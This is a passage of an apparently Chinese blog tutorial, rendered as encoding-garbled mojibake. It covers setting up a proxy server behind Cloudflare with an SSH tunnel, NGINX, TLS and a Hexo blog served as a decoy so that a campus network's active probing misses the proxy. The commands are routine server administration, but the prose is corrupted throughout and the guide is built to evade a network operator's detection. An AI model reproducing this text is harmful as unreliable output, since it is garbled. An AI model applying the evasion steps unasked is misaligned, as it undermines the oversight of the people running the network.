href="https://app.cloudcone.com.cn/vps/262/create?token=cc-turns-7-cs-1">12åˆ€ä¸€å¹´çš„å° VPS</a> ï¼Œæˆ–è€…æ˜¯ RackNerd çš„ <a href="https://www.rnvps.com/go-358">11 åˆ€ä¸€å¹´çš„å° VPS</a> ï¼Œ<del>å½“ç„¶è¿™ç§ä¾¿å®œè´§å°±ä¸è¦æƒ³æœ‰å¤ªå¥½çš„è´¨é‡äº†</del>ï¼š</p><p><img src="https://s2.loli.net/2024/09/30/ijyQ2LxfCn4STkv.png" alt="åæ­£ç¬”è€…æ˜¯ä¹°äº†ä¸€å°ä»¥å¤‡ä¸æ—¶ä¹‹éœ€"></p></blockquote><h2 id="Pre-åŸŸåè´­ä¹°"><a href="#Pre-åŸŸåè´­ä¹°" class="headerlink" title="Pre. åŸŸåè´­ä¹°"></a>Pre. åŸŸåè´­ä¹°</h2><p>å› ä¸ºæˆ‘ä»¬åé¢è¦ç”¨ Cloudflare åš CDNï¼Œæ‰€ä»¥ç›´æ¥ä¸Š Cloudflare ä¹°ä¸€ä¸ªå°±å¥½äº†ï¼Œåæ­£ä¸åŒçš„åŸŸåæä¾›å•†ä¹‹é—´ä»·æ ¼å·®åˆ«ä¹Ÿä¸ç®—å¤ªå¤§ï¼Œåœ¨å…¶ä»–åŸŸåæä¾›å•†ä¹°äº†å†è½¬åˆ° Cloudflare è¿˜ä¼šæ¯”è¾ƒéº»çƒ¦</p><p>ä¾‹å¦‚ä¹°ä¸ª <code>114514beastsenbei.uk</code> ï¼Œä¸€å¹´åªè¦ <code>4.94USD</code> ï¼Œå°‘å–å‡ æ¯é¥®æ–™å°±çœå‡ºæ¥äº†ï¼š ï¼‰</p><p><img src="https://s2.loli.net/2024/09/18/ztD75NwACxynpQf.png"></p><blockquote><p>æ³¨ï¼šè¿™ä¸ªåŸŸåç°åœ¨è¿˜æ²¡äººæ³¨å†Œï¼Œå¿ƒåŠ¨çš„å…ˆè¾ˆå»ºè®®èµ¶ç´§é›·â€¦é›·å‰é£è¡Œåœ°è´­ä¹°ï¼ˆå¤§å˜˜</p></blockquote><h1 id="0x02-æ­£å¼æ­å»ºä»£ç†æœåŠ¡å™¨"><a href="#0x02-æ­£å¼æ­å»ºä»£ç†æœåŠ¡å™¨" class="headerlink" title="0x02. æ­£å¼æ­å»ºä»£ç†æœåŠ¡å™¨"></a>0x02. æ­£å¼æ­å»ºä»£ç†æœåŠ¡å™¨</h1><h2 id="é…ç½®åŸŸåè§£æå’Œ-Cloudflare-ä»£ç†"><a href="#é…ç½®åŸŸåè§£æå’Œ-Cloudflare-ä»£ç†" class="headerlink" title="é…ç½®åŸŸåè§£æå’Œ Cloudflare ä»£ç†"></a>é…ç½®åŸŸåè§£æå’Œ Cloudflare ä»£ç†</h2><p>ä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢ IP ç›´è¿è¢«å° IP åé¢ä¼šå¾ˆéº»çƒ¦ï¼Œä»¥åŠé¿å…æœåŠ¡å™¨çœŸå® IP è¢«æ¢æŸ¥åˆ°ï¼š</p><p><img src="https://s2.loli.net/2024/09/12/XfYnZj1a3icGKu2.png"></p><h2 id="é…ç½®-SSH-Tunnel"><a href="#é…ç½®-SSH-Tunnel" class="headerlink" title="é…ç½® SSH Tunnel"></a>é…ç½® SSH Tunnel</h2><p>ç”¨ ssh ç›´æ¥è¿æ¥ IP æ¯”è¾ƒå±é™©ï¼Œä¸‡ä¸€ IP æˆ–è€…ç«¯å£è¢«å­¦æ ¡å°é”äº†ç›´æ¥è¿ä¸ä¸ŠæœåŠ¡å™¨å°±å°´å°¬äº†ï¼Œå› æ­¤æˆ‘ä»¬æ¨èä½¿ç”¨ Cloudflare åˆ›å»º SSH Tunnel</p><blockquote><p>Cloudflareï¼ŒğŸ‘´æ»´è¶…äººï¼</p></blockquote><p>ç®€è€Œè¨€ä¹‹åˆ›å»ºæ­¥éª¤é¦–å…ˆæ˜¯ <code>Zero Trust -&gt; Networks -&gt; Tunnels -&gt; Add a tunnel -&gt; Select Cloudflared -&gt; å‘½å -&gt; å®‰è£… Cloudflared -&gt; é…ç½® Route Traffic</code> </p><p>å¯¹äº openSUSE è€Œè¨€ï¼ŒTumbleweed å¯ä»¥ç›´æ¥å®‰è£…ï¼ŒLeap åˆ™éœ€è¦å€ŸåŠ© OPI å®‰è£… experimental packageï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> opi</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo opi cloudflared</span><br></code></pre></td></tr></table></figure><blockquote><p>å®é™…ä¸Šï¼Œ Cloudflare å®˜ç½‘ç»™å‡ºçš„å®‰è£… Cloudflared çš„æ–¹å¼æ˜¯éå¸¸åŸå§‹çš„ç›´æ¥ä¸‹è½½è½¯ä»¶åŒ…å¹¶å®‰è£…ï¼Œè€Œä¸”åªæä¾›äº† Deb å’Œ Rpmï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ä¼ åˆ°å„å¤§å‘è¡Œç‰ˆä»“åº“å‘¢ï¼š(</p></blockquote><p>å®Œæˆ Cloudflare å®‰è£…åä½¿ç”¨å®˜ç½‘ç»™çš„å‚æ•°å¯åŠ¨ï¼š</p><p><img src="https://s2.loli.net/2024/09/12/ZDevGiAkytf6BU9.png"></p><p>æˆåŠŸè¿æ¥ä¸Šåé…ç½®ä¸€ä¸‹ Tunnel ç±»å‹ç­‰ä¿¡æ¯å³å¯ï¼Œæ³¨æ„è¿™ä¸ªåŸŸåä¸èƒ½ä¸ç°æœ‰åŸŸåè®°å½•å†²çªï¼š</p><blockquote><p><code>URL</code> å¯ä»¥ç›´æ¥å†™ <code>127.0.0.1:22</code></p></blockquote><p><img src="https://s2.loli.net/2024/09/12/ANOrRq7LtK4ZUvH.png"></p><p>æœ€ååœ¨æœ¬åœ°ä¹Ÿå®‰è£…ä¸€ä¸ª <code>cloudflared</code> ï¼ˆæœ¬åœ°ä¸ç”¨åˆ›å»º tunnelï¼‰ï¼Œå¹¶åœ¨ <code>.ssh/config</code> ä¸­æ·»åŠ å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Host ä½ çš„è‡ªå®šä¹‰åŸŸå<br>        HostName ä½ çš„è‡ªå®šä¹‰åŸŸå<br>        TCPKeepAlive yes<br>        <span class="hljs-keyword">User</span> <span class="hljs-title">arttnba3</span><br>        ServerAliveInterval <span class="hljs-number">15</span><br>        IdentityFile ä½ çš„ç§é’¥ä½ç½®ï¼Œä¾‹å¦‚~/.ssh/id_ed25519<br>        Port <span class="hljs-number">22</span><br>        ProxyCommand cloudflared access ssh --hostname %h<br></code></pre></td></tr></table></figure><p>ä¹‹åä¾¿èƒ½é€šè¿‡åŸŸåè¿æ¥äº†ï¼š</p><p><img src="https://s2.loli.net/2024/09/12/68RhKDnl2FWjoI3.png"></p><h2 id="TLS-è¯ä¹¦é…ç½®"><a href="#TLS-è¯ä¹¦é…ç½®" class="headerlink" title="TLS è¯ä¹¦é…ç½®"></a>TLS è¯ä¹¦é…ç½®</h2><h3 id="æ–¹æ³•ä¸€ï¼šLetâ€™s-Encrypt-ACMS-è‡ªåŠ¨æ›´æ–°-TLS-è¯ä¹¦ï¼ˆğŸ•Šï¼‰"><a href="#æ–¹æ³•ä¸€ï¼šLetâ€™s-Encrypt-ACMS-è‡ªåŠ¨æ›´æ–°-TLS-è¯ä¹¦ï¼ˆğŸ•Šï¼‰" class="headerlink" title="æ–¹æ³•ä¸€ï¼šLetâ€™s Encrypt + ACMS è‡ªåŠ¨æ›´æ–° TLS è¯ä¹¦ï¼ˆğŸ•Šï¼‰"></a>æ–¹æ³•ä¸€ï¼šLetâ€™s Encrypt + ACMS è‡ªåŠ¨æ›´æ–° TLS è¯ä¹¦ï¼ˆğŸ•Šï¼‰</h3><blockquote><p>ä½ å¯ä»¥é€‰æ‹©ä¼¼ä¹æ˜¯æ›´åŠ æ–¹ä¾¿çš„ <a href="https://github.com/acmesh-official/acme.sh/wiki/%E8%AF%B4%E6%98%8E">ACME</a> ï¼Œ<del>åæ­£ç¬”è€…æ‡’å¾—ç ”ç©¶è¿™ä¸ªä¸œè¥¿è¯¥æ€ä¹ˆç”¨</del></p></blockquote><h3 id="æ–¹æ³•äºŒï¼šç›´æ¥ä½¿ç”¨-Cloudflare-çš„å…è´¹-TLS-è¯ä¹¦"><a href="#æ–¹æ³•äºŒï¼šç›´æ¥ä½¿ç”¨-Cloudflare-çš„å…è´¹-TLS-è¯ä¹¦" class="headerlink" title="æ–¹æ³•äºŒï¼šç›´æ¥ä½¿ç”¨ Cloudflare çš„å…è´¹ TLS è¯ä¹¦"></a>æ–¹æ³•äºŒï¼šç›´æ¥ä½¿ç”¨ Cloudflare çš„å…è´¹ TLS è¯ä¹¦</h3><p>Cloudflare æä¾›äº†å…è´¹çš„ TLS è¯ä¹¦ï¼Œç›´æ¥åˆ›å»ºå³å¯ï¼š</p><p><img src="https://s2.loli.net/2024/09/11/8bKsuFVLBHNIde1.png" alt="æœ‰æ•ˆæœŸæœ‰tmçš„15å¹´ï¼Œè¿™è¿˜è¦å•¥è‡ªè¡Œè½¦ï¼"></p><p>ä¹‹åä¼šä¿å­˜ä¸‹æ¥ä¸€ä»½ PEM å’Œä¸€ä»½ KEY æ–‡ä»¶ï¼Œæˆ‘ä»¬å°†åœ¨åç»­é…ç½® NGINX æ—¶ä½¿ç”¨åˆ°è¿™ä¸ªä¸œè¥¿</p><p>ä»¥åŠåˆ«å¿˜äº†æŠŠ Cloudflare ä¸­çš„ TLS åŠ å¯†æ”¹ä¸ºä¸¥æ ¼ï¼Œå¦åˆ™å¾ˆå®¹æ˜“è«åå…¶å¦™å°± 404 äº†ï¼š</p><p><img src="https://s2.loli.net/2024/09/12/vmE4h23kVWMw6Hr.png"></p><h2 id="NGINX-æ­å»º"><a href="#NGINX-æ­å»º" class="headerlink" title="NGINX æ­å»º"></a>NGINX æ­å»º</h2><blockquote><p> è¿™ä¸ªç½‘ä¸Šæ•™ç¨‹å°±éå¸¸å¤šäº†ï¼Œç¬”è€…è¿™é‡Œä»…ç®€ç•¥è®²è®²ï¼Œä½ ä¹Ÿå¯ä»¥ä¸ç”¨å‚ç…§ç¬”è€…æ‰€å†™çš„è¿™ä¸€èŠ‚ï¼šï¼‰</p></blockquote><p>é¦–å…ˆé…ç½®é˜²ç«å¢™ï¼Œå¼€å¯æ­£å¸¸ç½‘ç«™æ‰€éœ€çš„ 80 å’Œ 443 ç«¯å£ï¼Œè¿™é‡Œä»¥ <code>firewalld</code> ä¸ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo firewall-cmd --zone=public --add-port=443/tcp --permanent</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo firewall-cmd --reload</span><br></code></pre></td></tr></table></figure><p>å¦‚æœä½ çš„æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯ <code>ufw</code> ï¼Œåˆ™å‚ç…§å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ufw allow 80/tcp</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ufw allow 443/tcp</span><br></code></pre></td></tr></table></figure><p>ç„¶åå®‰è£… NGINXï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> nginx</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now nginx.service</span><br></code></pre></td></tr></table></figure><p>ç„¶åç®€å•é…ç½®ä¸€ä¸ªé™æ€ç½‘é¡µç•Œé¢ä½œä¸ºä¼ªè£…ï¼Œä»¥é˜²ä¸‡ä¸€æ ¡æ–¹è¿›è¡Œä¸»åŠ¨æ¢æµ‹å‘ç°æƒ…å†µä¸å¯¹ï¼Œé¦–å…ˆåˆ›å»ºé…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">touch</span> /etc/nginx/vhosts.d/ä½ çš„åŸŸå.conf</span><br></code></pre></td></tr></table></figure><p>åœ¨æ–‡ä»¶ä¸­å†™å…¥å¦‚ä¸‹å†…å®¹ï¼Œç¬¬ä¸€ä¸ª server æ˜¯æ­£å¸¸çš„ https ç½‘ç«™é…ç½®ï¼Œç¬¬äºŒä¸ª server æ˜¯ç›‘å¬ 80 ç«¯å£å°† http è·³è½¬åˆ° httpsï¼Œå‰©ä¸‹ä¸¤ä¸ªæ˜¯æŠŠæœªé€šè¿‡æŒ‡å®šåŸŸåçš„è®¿é—®å…¨éƒ½è¿”å› 403 Forbiddenï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">server_name</span> ä½ çš„åŸŸå;<br>        <span class="hljs-attribute">ssl_certificate</span>     ä½ çš„ .pem è¯ä¹¦è·¯å¾„;<br>        <span class="hljs-attribute">ssl_certificate_key</span> ä½ çš„ .key å¯†é’¥è·¯å¾„;<br>        <span class="hljs-section">location</span> / &#123;<br>                <span class="hljs-attribute">root</span> ä½ çš„é™æ€ç½‘é¡µç›®å½•;<br>                <span class="hljs-attribute">index</span> ä½ çš„ç½‘ç«™é¦–é¡µæ–‡ä»¶ï¼ˆä¾‹å¦‚ index.htmlï¼‰;<br>        &#125;<br>&#125;<br><br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">80</span>;<br>        <span class="hljs-attribute">server_name</span> ä½ çš„åŸŸå;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">301</span> https://ä½ çš„åŸŸå<span class="hljs-variable">$request_uri</span>;<br>&#125;<br><br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span>;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span>;<br>        <span class="hljs-attribute">server_name</span> ä½ çš„IP;<br>        <span class="hljs-attribute">ssl_certificate</span>     ä½ çš„ .pem è¯ä¹¦è·¯å¾„;<br>        <span class="hljs-attribute">ssl_certificate_key</span> ä½ çš„ .key å¯†é’¥è·¯å¾„;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>&#125;<br><br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">80</span>;<br>        <span class="hljs-attribute">server_name</span> ä½ çš„IP;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>é‡å¯ NGINXï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart nginx.service</span><br></code></pre></td></tr></table></figure><p>ä¹‹åå°±èƒ½æ­£å¸¸çœ‹åˆ°æˆ‘ä»¬çš„ç½‘ç«™äº†ï¼Œè¿™é‡Œç¬”è€…éšä¾¿æ”¾äº†ä¸€ä¸ªæµ‹è¯•é¡µé¢ï¼š</p><p><img src="https://s2.loli.net/2024/09/12/bLMckeJWH6Bi2CN.png"></p><h2 id="é…ç½®-git-hexo-ç½‘é¡µä¼ªè£…ï¼ˆå¯é€‰ï¼‰"><a href="#é…ç½®-git-hexo-ç½‘é¡µä¼ªè£…ï¼ˆå¯é€‰ï¼‰" class="headerlink" title="é…ç½® git + hexo ç½‘é¡µä¼ªè£…ï¼ˆå¯é€‰ï¼‰"></a>é…ç½® git + hexo ç½‘é¡µä¼ªè£…ï¼ˆå¯é€‰ï¼‰</h2><h3 id="1ï¸âƒ£-å®‰è£…-hexo"><a href="#1ï¸âƒ£-å®‰è£…-hexo" class="headerlink" title="1ï¸âƒ£ å®‰è£… hexo"></a>1ï¸âƒ£ å®‰è£… hexo</h3><p>ä»…æœ‰ä¸€ä¸ªç©ºç™½é¡µé¢çš„ç½‘ç«™å°±åƒä¸€ä¸ªä¸€ç¢°å°±ç¢çš„çº¸è€è™ï¼Œæ ¡æ–¹ä¸€æ—¦è¿›è¡Œä¸»åŠ¨æ¢æµ‹å¾ˆå®¹æ˜“å°±ä¼šå‘ç°è¿™æ ·ä¸€ä¸ªç½‘é¡µå¹¶ä¸å€¼å¾—æœ‰è¿™ä¹ˆé«˜çš„è®¿é—®æµé‡ï¼Œä»è€Œç›´æ¥å°ç¦åŸŸåï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦é…ç½®ä¸€ä¸ªæ›´åŠ å®Œå–„çš„é™æ€ç½‘é¡µä½œä¸ºä¼ªè£…</p><p>æ¯”è¾ƒå®¹æ˜“æƒ³åˆ°çš„æ˜¯å¯ä»¥æŠŠè¿™ä¸ªç½‘ç«™é…ç½®æˆä¸€ä¸ªç±»ä¼¼ä¸ªäººåšå®¢è¿™æ ·çš„ç½‘ç«™ï¼Œå¹¶åœ¨ä¸Šé¢æ”¾ä¸€äº›æœ‰æ„ä¹‰çš„å†…å®¹ï¼Œè¿™æ ·å³ä½¿æ‰‹å·¥æ¢æµ‹ä¹Ÿ <em>ä¸€æ—¶æ— æ³•å‘ç°ç«¯å€ª</em> </p><blockquote><p>å½“ç„¶ï¼Œè¿™ä¸ªåšæ³•è¯´å®è¯è¿˜æ˜¯æœ‰ç‚¹ <strong>è‡ªæ¬ºæ¬ºäºº</strong> çš„ï¼Œæ ¡å›­ç½‘å¦‚æœçœŸæƒ³å°ä½ éš¾é“è¿˜è¦æŒ‘æ—¶é—´çœ‹ç†ç”±ï¼Ÿ</p></blockquote><p>é¦–å…ˆæ˜¯é…ç½® hexoï¼Œç»†èŠ‚ç¬”è€…å°±ä¸è¯´äº†åæ­£ä¸å°‘æœ‰è‡ªå·±åšå®¢çš„äººå¤§éƒ½åº”è¯¥å°è¯•è¿‡ï¼ˆåŒ…æ‹¬æœ¬ç«™ä¹Ÿæ˜¯ä½¿ç”¨ hexo éƒ¨ç½²çš„ï¼‰ï¼Œç®€è€Œè¨€ä¹‹åªéœ€è¦ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">æ³¨ï¼šä½ å¾—å…ˆå®‰è£… nodejsï¼Œä»¥ openSUSE ä¸ºä¾‹æ˜¯ sudo zypper <span class="hljs-keyword">in</span> nodejs-common</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo npm install -g hexo</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">hexo init blog</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> blog</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">npm install</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">npm install hexo-deployer-git --save</span><br></code></pre></td></tr></table></figure><blockquote><p> å¦‚æœè¦åœ¨æœ¬åœ°æŸ¥çœ‹éƒ¨ç½²æ•ˆæœï¼Œç›´æ¥ <code>hexo server</code> å³å¯åœ¨ <code>localhost:4000</code> æŸ¥çœ‹</p></blockquote><h3 id="2ï¸âƒ£-æ¨é€è¿œç¨‹"><a href="#2ï¸âƒ£-æ¨é€è¿œç¨‹" class="headerlink" title="2ï¸âƒ£ æ¨é€è¿œç¨‹"></a>2ï¸âƒ£ æ¨é€è¿œç¨‹</h3><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹å¦‚ä½•éƒ¨ç½²åœ¨è¿œç¨‹æœåŠ¡å™¨ï¼Œè¿™é‡Œç¬”è€…æ¨èä½¿ç”¨ git è¿›è¡Œéƒ¨ç½²ï¼ˆ <del>å› ä¸ºçœ‹äº†ä¸€åœˆå…¶ä»–éƒ¨ç½²æ–¹å¼è¦ä¹ˆå¹´ä¹…å¤±ä¿®è¦ä¹ˆéœ€è¦é¢å¤–å¼€ç«¯å£è¦ä¹ˆè¦å¼€å¯å¯†ç éªŒè¯ï¼Œä¸å¤ªå®‰å…¨</del> ï¼‰ï¼Œé¦–å…ˆæˆ‘ä»¬åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šå®‰è£… Git å¹¶é…ç½®ä¸€ä¸ªæ–°çš„ git ç”¨æˆ·ï¼š</p><blockquote><p>æ³¨ï¼šå…¶å®ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ä¸ªäººè´¦æˆ·ï¼Œä¸ä¸€å®šè¦æ–°å»ºä¸€ä¸ª <code>git</code> ç”¨æˆ·</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo groupadd git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo useradd -m -s /bin/bash -g git git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo passwd git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> ~/.ssh</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ä½ çš„å…¬é’¥&quot;</span> &gt; ~/.ssh/authorized_keys</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºç©ºç™½ git ä»“åº“ï¼Œå¹¶æ·»åŠ  hook æ‰§è¡Œæƒé™ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git init --bare ~/blog.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">touch</span> ~/blog.git/hooks/post-receive</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x ~/blog.git/hooks/post-receive</span><br></code></pre></td></tr></table></figure><p>ç„¶åä¿®æ”¹ git ä»“åº“ç›®å½•ä¸‹çš„ <code>hooks/post-receive</code> æ–‡ä»¶å†™å…¥å¦‚ä¸‹å†…å®¹ä»¥é…ç½®æ¨é€ä¸Šæ¥çš„æ–‡ä»¶å­˜æ”¾çš„ç›®å½•ï¼ˆåˆ«å¿˜äº†ç»™ç›¸åº”æ–‡ä»¶å¤¹è®¿é—®æƒé™ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git --work-tree=/srv/www/hexo-blog --git-dir=/home/git/blog.git checkout -f<br></code></pre></td></tr></table></figure><p>ç„¶åä¿®æ”¹ hexo blog æ–‡ä»¶å¤¹æ ¹ç›®å½•çš„ <code>_config.yml</code> ï¼Œåœ¨æœ«å°¾æ·»åŠ  git ç›¸å…³é…ç½®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">deploy:<br>  type: git<br>  repo: git@ä½ çš„sshåŸŸå:~/blog.git<br></code></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œå¦‚ä¸‹<del>ç†Ÿæ‚‰å¾—ä¸èƒ½å†ç†Ÿæ‚‰çš„</del>å‘½ä»¤è¿›è¡Œæ¨é€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">hexo d -g</span><br></code></pre></td></tr></table></figure><p>æœ€åä¿®æ”¹ NGINX é…ç½®é‡Œçš„é™æ€ç½‘é¡µç›®å½•ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">server_name</span> ä½ çš„åŸŸå;<br>        <span class="hljs-attribute">ssl_certificate</span>     ä½ çš„ .pem è¯ä¹¦è·¯å¾„;<br>        <span class="hljs-attribute">ssl_certificate_key</span> ä½ çš„ .key å¯†é’¥è·¯å¾„;<br>        <span class="hljs-section">location</span> / &#123;<br>                <span class="hljs-attribute">root</span> /srv/www/hexo-blog;<br>                <span class="hljs-attribute">index</span> index.html;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‡å¯ NGINXï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart nginx.service</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°±èƒ½æ­£å¸¸çœ‹åˆ° hexo åšå®¢é¡µé¢äº†ï¼š</p><p><img src="https://s2.loli.net/2024/09/18/VtjC975S2bqUHgs.png"></p><blockquote><p>æ›´æ¢ä¸»é¢˜åå¯èƒ½ä¼šç¢°åˆ°å¥— CDN çš„åœ°å€è®¿é—®å‘ç°æ ·å¼è¡¨ç‚¸äº†çš„é—®é¢˜ï¼Œå¯èƒ½æ˜¯ç¼“å­˜æ²¡åˆ·æ–°ï¼Œç¨å¾®ç­‰ä¸€ç­‰å°±å¥½ï¼ˆå‡ ååˆ†é’Ÿåˆ°å‡ å°æ—¶ï¼Ÿï¼‰</p></blockquote><h2 id="é…ç½®-XRAY-Trojan-ä»£ç†"><a href="#é…ç½®-XRAY-Trojan-ä»£ç†" class="headerlink" title="é…ç½® XRAY Trojan ä»£ç†"></a>é…ç½® XRAY Trojan ä»£ç†</h2><p>æ€»ç®—åˆ°äº†å®‰è£…çœŸæ­£çš„ä»£ç†å·¥å…·çš„æ—¶å€™ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹© Xray ä½œä¸ºä»£ç†è½¯ä»¶ï¼Œä»£ç†åè®®å‡ºäºå®‰å…¨èµ·è§é€‰æ‹© Trojan</p><h3 id="æ–¹æ³•1ï¸âƒ£ï¼šä½¿ç”¨-Docker-è¿›è¡Œéƒ¨ç½²ï¼ˆæ¨èï¼‰"><a href="#æ–¹æ³•1ï¸âƒ£ï¼šä½¿ç”¨-Docker-è¿›è¡Œéƒ¨ç½²ï¼ˆæ¨èï¼‰" class="headerlink" title="æ–¹æ³•1ï¸âƒ£ï¼šä½¿ç”¨ Docker è¿›è¡Œéƒ¨ç½²ï¼ˆæ¨èï¼‰"></a>æ–¹æ³•1ï¸âƒ£ï¼šä½¿ç”¨ Docker 